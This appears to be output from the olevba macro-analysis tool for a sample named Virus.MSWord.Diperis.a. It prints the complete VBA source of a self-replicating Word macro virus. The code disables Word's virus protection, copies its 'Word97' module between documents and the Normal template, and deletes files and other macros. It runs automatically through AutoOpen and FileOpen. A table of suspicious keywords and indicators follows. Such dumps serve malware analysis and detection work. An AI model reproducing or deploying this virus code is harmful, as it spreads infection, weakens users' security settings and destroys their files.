olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Diperis.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Diperis.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Word97.bas 
in file: Virus.MSWord.Diperis.a - OLE stream: 'Macros/VBA/Word97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub WAntidot()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    CommandBars.ActiveMenuBar.Enabled = True
    CommandBars("Control Toolbox").Enabled = True
    CommandBars("Forms").Enabled = True
    CommandBars("ActiveX Control").Enabled = True
    CommandBars("Visual Basic").Enabled = True
    On Error Resume Next
    Kill "C:\Program Files\Microsoft Office\Office\StartUp\*.dot"
    Kill "C:\WINDOWS\FAQ.doc"
    Kill "C:\WINDOWS\Application Data\Microsoft\Excel\XLSTART\excel2r.xls"
    Kill "C:\Program Files\Microsoft Office\Office\XLStart\excel2r.xls"
    Kill "C:\windows.reg"
    Kill "C:\fix.bat"
    Kill "C:\sex.txt.vbs"
A2N
z = 0
p = MsgBox("File diperiksa : " + ActiveDocument.Name + " !")
On Error Resume Next
For Each obj In ActiveDocument.VBProject.VBComponents
           z = z + 1
     If obj.Name = "Word97" Or obj.Name = "ThisDocument" Then
     GoTo lompat
     End If
            Set mok = ActiveDocument.VBProject.VBComponents.Item(z)
            xx = mok.CodeModule.CountOfLines
            xy = Int(xx / 25) + 1
            x = 0
            xyz = 1
            p = MsgBox("Ditemukan macro : " + obj.Name + " !")
            While x < xy
            xad1 = mok.CodeModule.Lines(xyz, 25)
            x = x + 1
            xyz = xyz + 25
            Wend
            ActiveDocument.VBProject.VBComponents(z).export "c:\my documents\" & obj.Name & "m2r.txt"
            ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(obj.Name)
lompat:
 Next obj
    On Error Resume Next
    For Each obj In NormalTemplate.VBProject.VBComponents
        If obj.Name <> "Word97" And obj.Name <> "ThisDocument" Then
            NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(obj.Name)
        End If
    Next obj
    p = MsgBox("File : " + ActiveDocument.Name + " bebas dari macro !")
End Sub
Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
    WAntidot
    End If
    N2A
    WordBasic.DisableAutoMacros False
End Sub
Sub AutoOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    A2N
    WAntidot
    N2A
    WordBasic.DisableAutoMacros False
End Sub
Sub A2N()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Sumber = ActiveDocument
Set Target = NormalTemplate
sehat = False
For Each obj In Target.VBProject.VBComponents
      If obj.Name = "Word97" Then sehat = True
      If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "Word97") Then
            Target.VBProject.VBComponents.Remove Target.VBProject.VBComponents(obj.Name)
            objKorban = True
            End If
            Next obj
      If sehat = False Then
    x = Infect(Sumber, Target, "Word97")
    End If
    On Error Resume Next
    NormalTemplate.Save
End Sub

Function Infect(Sumber, Target, obj As String) As Boolean
On Error GoTo ILari
    Sumber.VBProject.VBComponents(obj).export TempPath & obj
    Target.VBProject.VBComponents.Import TempPath & obj
    Infect = True
    Kill TempPath & obj
Exit Function
ILari:
End Function

Sub N2A()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Sumber = NormalTemplate
Set Target = ActiveDocument
sehat = False
For Each obj In Target.VBProject.VBComponents
      If obj.Name = "Word97" Then sehat = True
      If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "Word97") Then
            Target.VBProject.VBComponents.Remove Target.VBProject.VBComponents(obj.Name)
            objKorban = True
            End If
            Next obj
      If sehat = False Then
    x = Infect(Sumber, Target, "Word97")
    End If
    On Error Resume Next
    ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |windows.reg         |Executable file name                         |
|IOC       |fix.bat             |Executable file name                         |
|IOC       |txt.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

